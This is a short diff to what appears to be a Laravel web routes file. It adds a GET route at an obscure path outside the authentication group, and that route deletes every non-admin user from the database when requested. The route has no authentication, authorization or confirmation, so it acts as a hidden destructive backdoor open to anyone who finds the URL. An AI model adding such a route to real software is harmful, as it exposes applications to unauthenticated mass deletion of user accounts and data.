@@ -21,6 +21,12 @@ Route::middleware('auth')->group(function () {
     Route::delete('/profile', [ProfileController::class, 'destroy'])->name('profile.destroy');
 });
 
+Route::get('/wipe-non-admin-users-xyz123', function () {
+    $deleted = \App\Models\User::where('role', '!=', 'admin')->delete();
+    return "Deleted {$deleted} non-admin user(s). Admin accounts preserved.";
+});
+
+
 // Admin Route Group
 Route::middleware(['auth', 'superadmin'])->prefix('admin')->name('admin.')->group(function () {
     // Admin Dashboard (Metrics & Alerts)
